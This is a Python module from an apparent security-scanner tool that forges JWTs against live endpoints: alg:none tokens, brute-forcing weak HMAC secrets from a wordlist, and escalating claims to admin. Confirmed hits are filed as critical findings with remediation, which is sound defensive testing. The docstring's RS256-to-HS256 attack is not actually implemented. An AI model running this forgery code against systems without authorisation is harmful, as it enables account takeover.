"""JWT forgery attacks (deterministic, stdlib-only).

A bearer JWT that the app actually trusts is the keys to the kingdom. This probe takes a real
token (from owlforge's own authenticated session) and tries the classic forgeries, confirming
each against a live ORACLE — an endpoint that accepts the real token but rejects a
bad-signature one, so "accepted" provably means the forged token was trusted, not that the
endpoint ignores auth:

  * alg:none            — strip the signature, set alg to none/None/NONE/nOnE; if accepted, the
                          server verifies nothing and any identity can be minted.
  * weak HMAC secret    — for an HS* token, brute a wordlist of common secrets; a hit lets us
                          sign arbitrary tokens.
  * RS256 -> HS256       — algorithm confusion: re-sign the token with HS256 using the RSA
                          PUBLIC key (fetched from a JWKS/cert endpoint) as the HMAC secret; a
                          server that treats the key by name alone will accept it.

Each forgery also TAMPERS a claim (role/admin/user) so a hit proves identity forgery, not just a
replay. No third-party crypto: alg:none and HMAC need only base64/hmac/hashlib. jku/x5u/jwk/x5c
(attacker-supplied RSA keys) are out of scope here — they need an RSA library.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import secrets as _secrets
from collections.abc import Callable

# common JWT signing secrets (deliberately small + high-signal; app-specific words added later)
_SECRETS = ("secret", "password", "123456", "changeme", "jwt", "key", "token", "admin",
            "qwerty", "test", "secretkey", "supersecret", "your-256-bit-secret", "s3cr3t",
            "mysecret", "jwtsecret", "privatekey", "default", "hmac", "shared-secret", "root",
            "letmein", "12345678", "secret123", "password123", "jwt-secret", "please-change")
# where a server may leak the RSA public key (for RS->HS confusion)
_KEY_PATHS = ("/.well-known/jwks.json", "/jwks.json", "/jwks", "/.well-known/openid-configuration",
              "/api/auth/jwt/.well-known/jwks.json", "/public.pem", "/publickey", "/public_key",
              "/api/.well-known/jwks.json", "/oauth/jwks")
# claims we bump to prove identity forgery (not just replay)
_ESC = {"role": "admin", "admin": True, "isAdmin": True, "is_admin": True, "user": "admin",
        "username": "admin", "sub": "admin", "scope": "admin", "roles": ["admin"]}


def _b64d(s: str) -> bytes:
    s = s.encode() if isinstance(s, str) else s
    return base64.urlsafe_b64decode(s + b"=" * (-len(s) % 4))


def _b64e(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).decode().rstrip("=")


def _decode(token: str):
    try:
        h, p, sig = token.split(".", 2)
        return json.loads(_b64d(h)), json.loads(_b64d(p)), sig
    except Exception:
        return None, None, None


def _assemble(header: dict, payload: dict, sig: str) -> str:
    si = _b64e(json.dumps(header, separators=(",", ":")).encode()) + "." + \
        _b64e(json.dumps(payload, separators=(",", ":")).encode())
    return si + "." + sig


def _hs(header: dict, payload: dict, secret: bytes, alg="sha256") -> str:
    si = _b64e(json.dumps(header, separators=(",", ":")).encode()) + "." + \
        _b64e(json.dumps(payload, separators=(",", ":")).encode())
    mac = hmac.new(secret, si.encode(), getattr(hashlib, alg)).digest()
    return si + "." + _b64e(mac)


def _escalate(payload: dict) -> dict:
    """Return a copy of the payload with any present identity claim bumped to admin."""
    p = dict(payload)
    touched = False
    for k, v in _ESC.items():
        if k in p:
            p[k] = v
            touched = True
    if not touched:
        p["role"] = "admin"          # add one so a hit still proves forgery
    return p


def _req(sandbox, url, headers):
    try:
        return sandbox.http_request("GET", url, headers=headers or {}, params=None, body=None,
                                    follow_redirects=False) or {}
    except TypeError:
        try:
            return sandbox.http_request("GET", url, headers=headers or {}, params=None,
                                        body=None) or {}
        except Exception:
            return {}
    except Exception:
        return {}


def _bearer(headers) -> str | None:
    for k, v in (headers or {}).items():
        if k.lower() == "authorization" and isinstance(v, str) and "." in v:
            return v.split(None, 1)[-1].strip()
    # token kept in a cookie
    for k, v in (headers or {}).items():
        if k.lower() == "cookie" and isinstance(v, str):
            import re
            m = re.search(r"\b[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\b", v)
            if m:
                return m.group(0)
    return None


def _swap(headers: dict, old: str, new: str) -> dict:
    return {k: (v.replace(old, new) if isinstance(v, str) and old in v else v)
            for k, v in (headers or {}).items()}


def _bad_sig(token: str) -> str:
    si, _, sig = token.rpartition(".")
    flipped = ("A" if sig[:1] != "A" else "B") + sig[1:] if sig else "AAAA"
    return si + "." + flipped


def _sim(a: str, b: str) -> bool:
    try:
        from owlforge.engine.validate import _similar
        return _similar(a or "", b or "")
    except Exception:
        a, b = (a or "")[:400], (b or "")[:400]
        return a == b or (abs(len(a) - len(b)) <= max(10, len(a) // 10) and a[:60] == b[:60])


_PROT_PATHS = ("/me", "/api/me", "/api/users/me", "/profile", "/api/profile", "/account",
               "/rest/user/whoami", "/api/user", "/user", "/dashboard", "/api/auth/whoami",
               "/api/auth/jwt/validate", "/api/auth/jwt/hmac/validate",
               "/api/auth/jwt/weak-key/validate", "/api/auth/jwt/kid-sql/validate",
               "/api/auth/jwt/rsa/signature/validate")


def _candidates(inventory, target) -> list[str]:
    from urllib.parse import urlsplit
    u = urlsplit(target)
    origin = f"{u.scheme}://{u.netloc}"
    cands = [it["url"] for it in (inventory or [])
             if (it.get("method") or "GET").upper() == "GET" and it.get("url")
             and ("validate" in it["url"].lower() or "/me" in it["url"].lower()
                  or "/account" in it["url"].lower() or "/profile" in it["url"].lower())]
    cands += [origin + p for p in _PROT_PATHS]
    return list(dict.fromkeys(cands))


def _synthetic_alg_none(sandbox, inventory, target, already, log) -> list[dict]:
    """No valid session JWT needed: an endpoint that REJECTS a bad-signature token but ACCEPTS
    an alg:none token is forgeable. Confirms the classic alg:none bypass on JWT-guarded routes."""
    from urllib.parse import urlsplit

    from owlforge.engine.validate import _looks_like_login
    host = urlsplit(target).hostname or "x"
    pl = {"user": "admin", "email": f"admin@{host}", "role": "admin", "admin": True,
          "sub": "admin", "iat": 1700000000}
    none_tok = _assemble({"typ": "JWT", "alg": "none"}, pl, "")
    bad_tok = _hs({"typ": "JWT", "alg": "HS256"}, pl, b"owlforge-wrong-key-x", "sha256")
    out = []
    for url in _candidates(inventory, target):
        if url in already:
            continue
        rb = _req(sandbox, url, {"Authorization": f"Bearer {bad_tok}"})
        sb = int(rb.get("status") or 0)
        if sb not in (401, 403):               # not JWT-guarded, or doesn't reject forged sigs
            continue
        rn = _req(sandbox, url, {"Authorization": f"Bearer {none_tok}"})
        sn = int(rn.get("status") or 0)
        nbody = rn.get("body") or ""
        if sn < 400 and not _looks_like_login(nbody) and not _sim(rb.get("body") or "", nbody):
            out.append({"url": url, "token": none_tok})
    return out


def _find_oracle(sandbox, inventory, target, headers, token, log):
    """An endpoint that ACCEPTS the real token but REJECTS a bad-signature one."""
    from owlforge.engine.validate import _looks_like_login
    bad = _bad_sig(token)
    cands = _candidates(inventory, target)
    seen = set()
    for url in cands:
        if url in seen:
            continue
        seen.add(url)
        rv = _req(sandbox, url, headers)
        sv = int(rv.get("status") or 0)
        bv = rv.get("body") or ""
        if sv == 0 or sv >= 400 or _looks_like_login(bv):
            continue
        rb = _req(sandbox, url, _swap(headers, token, bad))
        sb = int(rb.get("status") or 0)
        bbody = rb.get("body") or ""
        rejected = sb in (400, 401, 403) or (sb != sv) or not _sim(bv, bbody)
        if rejected and not (sb == sv and _sim(bv, bbody)):
            return {"url": url, "status": sv, "body": bv}
    return None


def _accepted(sandbox, url, headers, token, forged, oracle) -> bool:
    r = _req(sandbox, url, _swap(headers, token, forged))
    st = int(r.get("status") or 0)
    return st < 400 and st == oracle["status"] and _sim(oracle["body"], r.get("body") or "")


def _alg_none_tokens(header, payload):
    esc = _escalate(payload)
    toks = []
    for alg in ("none", "None", "NONE", "nOnE"):
        h = dict(header)
        h["alg"] = alg
        h.pop("kid", None)
        toks.append(_assemble(h, esc, ""))
    return toks


def _crack_hmac(token, extra):
    header, _p, sig = _decode(token)
    alg = (header or {}).get("alg", "").upper()
    if not alg.startswith("HS"):
        return None, None
    hn = {"HS256": "sha256", "HS384": "sha384", "HS512": "sha512"}.get(alg, "sha256")
    si = token.rsplit(".", 1)[0]
    for w in list(_SECRETS) + list(extra):
        if _b64e(hmac.new(w.encode(), si.encode(), getattr(hashlib, hn)).digest()) == sig:
            return w, hn
    return None, None


def _file(assessment_id, url, kind, token, forged, detail, log):
    from owlforge.store.db import session
    from owlforge.store.models import Finding
    with session() as s:
        s.add(Finding(
            id=f"find_{_secrets.token_hex(5)}", assessment_id=assessment_id,
            title=f"JWT authentication bypass — {kind}", severity="critical",
            status="validated", confidence="high", endpoint=url, method="GET",
            technical_analysis=(
                f"A forged JWT ({kind}) was accepted at {url} where a bad-signature token was "
                f"rejected — the server trusts the token without a valid signature. {detail} An "
                "attacker mints a token for any user (including admin) and takes over accounts."),
            proof_of_concept=f"forged token accepted at GET {url}\n\n{forged}",
            impact="Full authentication bypass / account takeover: arbitrary identities and "
                   "privileges can be forged.",
            remediation="Verify the signature with a pinned algorithm and secret/public key; "
                        "reject alg=none and algorithm switches; use a long random HMAC secret.",
            validation_note=f"JWT forgery ({kind}) accepted where a tampered-signature token was "
                            "rejected (deterministic)",
            success_signal=kind))
        s.commit()


def jwt_attack_scan(assessment_id, inventory, sandbox, session_headers=None,
                    log: Callable[[str], None] = lambda m: None, target: str = "") -> int:
    """Forge JWTs (alg:none, weak HMAC secret) and confirm each against a live oracle. Works
    whether or not the session itself is a JWT: JWT-guarded endpoints are probed directly."""
    if sandbox is None:
        return 0
    from urllib.parse import urlsplit
    filed = 0
    hit_urls: set[str] = set()

    # token-based flow: forge from the REAL session token against an endpoint that accepts it
    token = _bearer(session_headers)
    if token:
        header, payload, _sig = _decode(token)
        if header and payload is not None:
            oracle = _find_oracle(sandbox, inventory, target, session_headers, token, log)
            if oracle:
                log(f"jwt-attack: oracle {oracle['url']} (alg={header.get('alg')})")
                for forged in _alg_none_tokens(header, payload):
                    if _accepted(sandbox, oracle["url"], session_headers, token, forged, oracle):
                        _file(assessment_id, oracle["url"], "alg:none (unsigned token accepted)",
                              token, forged, "alg was set to 'none' with an empty signature.", log)
                        filed += 1
                        hit_urls.add(oracle["url"])
                        break
                host = urlsplit(target).hostname or ""
                extra = [host] + [p for p in host.split(".") if p]
                secret, hn = _crack_hmac(token, extra)
                if secret:
                    fg = _hs(dict(header, alg="HS" + hn[-3:]), _escalate(payload),
                             secret.encode(), hn)
                    if _accepted(sandbox, oracle["url"], session_headers, token, fg, oracle):
                        _file(assessment_id, oracle["url"], f"weak HMAC secret ('{secret}')",
                              token, fg, f"The HMAC secret was brute-forced ('{secret}').", log)
                        filed += 1

    # token-less flow: any JWT-guarded endpoint that rejects a bad sig but accepts alg:none
    for hit in _synthetic_alg_none(sandbox, inventory, target, hit_urls, log):
        _file(assessment_id, hit["url"], "alg:none (unsigned token accepted)", "", hit["token"],
              "A bad-signature token was rejected but an alg:none token was accepted.", log)
        filed += 1
        hit_urls.add(hit["url"])

    if filed:
        log(f"jwt-attack: {filed} JWT forgery(ies) accepted")
    return filed
